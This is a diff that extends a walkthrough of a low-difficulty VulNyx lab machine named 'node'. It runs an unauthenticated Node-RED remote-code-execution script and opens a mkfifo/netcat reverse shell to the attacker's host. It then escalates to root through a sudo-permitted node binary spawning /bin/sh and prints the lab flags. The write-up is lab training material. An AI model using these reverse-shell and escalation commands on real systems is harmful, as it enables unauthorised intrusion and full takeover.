@@ -90,7 +90,95 @@ Nmap done: 1 IP address (1 host up) scanned in 46.69 seconds
 
 
 ### Shell (dev)
+![node-red-web](/walkthroughs/vulnyx/low-difficulty/node/Node-Web_web.png)
 
+```bash
+┌──(dungcngo㉿kali)-[~/…/walkthroughs/vulnyx/low-difficulty/node]
+└─$ python node_red_exploit.py http://192.168.100.185:1880
+[+] Node-RED does not require authentication.
+/home/dungcngo/Workspace/hackerhorse/walkthroughs/vulnyx/low-difficulty/node/node_red_exploit.py:299: DeprecationWarning: There is no current event loop
+  asyncio.get_event_loop().run_until_complete(exploit(args.url))
+[+] Establishing RCE link ....
+> whoami
+---------------------------------------------------------------------
+Your flow credentials file is encrypted using a system-generated key.
+
+If the system-generated key is lost for any reason, your credentials
+file will not be recoverable, you will have to delete it and re-enter
+your credentials.
+
+You should set your own key using the 'credentialSecret' option in
+your settings file. Node-RED will then re-encrypt your credentials
+file using your chosen key the next time you deploy a change.
+---------------------------------------------------------------------
+/home/dungcngo/Workspace/hackerhorse/walkthroughs/vulnyx/low-difficulty/node/node_red_exploit.py:271: RuntimeWarning: coroutine 'Connection.close' was never awaited
+  websocket.close()
+RuntimeWarning: Enable tracemalloc to get the object allocation traceback
+>
+```
+
+```bash
+┌──(dungcngo㉿kali)-[/tmp]
+└─$ nc -lvnp 443
+listening on [any] 443 ...
+```
+
+```bash
+> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.100.172 443 > /tmp/f
+
+```
+
+```bash
+┌──(dungcngo㉿kali)-[/tmp]
+└─$ nc -lvnp 443
+listening on [any] 443 ...
+connect to [192.168.100.172] from (UNKNOWN) [192.168.100.185] 45514
+/bin/sh: 0: can't access tty; job control turned off
+$ python -c 'import pty;pty.spawn("/bin/bash")'
+dev@node:~$ ls -la
+ls -la
+total 40
+drwx------ 5 dev  dev  4096 may 16  2023 .
+drwxr-xr-x 3 root root 4096 may 16  2023 ..
+lrwxrwxrwx 1 root root    9 abr 23  2023 .bash_history -> /dev/null
+-rw------- 1 dev  dev   220 ene 15  2023 .bash_logout
+-rw------- 1 dev  dev  3526 ene 15  2023 .bashrc
+drwxr-xr-x 3 dev  dev  4096 may 16  2023 .local
+drwxr-xr-x 4 dev  dev  4096 abr 17 04:17 .node-red
+drwxr-xr-x 3 dev  dev  4096 may 16  2023 .npm
+-rw------- 1 dev  dev   807 ene 15  2023 .profile
+-rw-r--r-- 1 dev  dev    66 may 16  2023 .selected_editor
+-r-------- 1 dev  dev    33 may 16  2023 user.txt
+```
 ### Privilege Escalation
+#### Enumeration
+```bash
+dev@node:~$ sudo -l
+sudo -l
+Matching Defaults entries for dev on node:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
 
-anh
+User dev may run the following commands on node:
+    (root) NOPASSWD: /usr/bin/node
+```
+#### Abuse
+```bash
+dev@node:~$ sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
+<ild_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
+# whoami
+whoami
+root
+```
+#### Flags
+```bash
+# find / -name root.txt 2>/dev/null | xargs cat
+find / -name root.txt 2>/dev/null | xargs cat
+022f2cdb73481093671bd0478637826e
+# cat user.txt  
+cat user.txt
+7af9fe48030ae8afab06e30ee132d9b4
+# 
+```
+
+***You are welcome!***
